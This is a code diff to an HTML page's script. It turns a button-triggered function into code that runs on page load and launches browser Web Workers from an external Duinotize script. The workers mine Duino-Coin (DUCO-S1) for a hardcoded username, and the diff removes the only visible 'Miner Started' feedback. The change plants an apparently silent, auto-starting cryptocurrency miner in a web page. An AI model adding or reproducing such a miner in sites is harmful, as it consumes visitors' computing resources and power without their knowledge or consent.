@@ -57,21 +57,19 @@
 </html>
 
 <script>
-function textchange() {
+    // Configs
     let username = "chunkymilk0309";
-    let rigid = "Duinotize-Demo";
+    let rigid = "demorig";
     let threads = 1;
     let difficulty = "LOW";
     let hasher = "DUCO-S1";
 
+    // DO NOT EDIT ANYTHING BELOW THIS LINE
     let wallet_id = Math.floor(Math.random() * 2811);
     let workerVer = 0;
-
     for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
-            var socketWorker = new Worker("https://ryanfortner.github.io/Duinotize/main.js");
-            socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
-            workerVer++;
-            document.getElementById('startminer').value = 'Miner Started';
+        var socketWorker = new Worker("https://ryanfortner.github.io/Duinotize/main.js");
+        socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
+        workerVer++;
     }
-}
 </script>
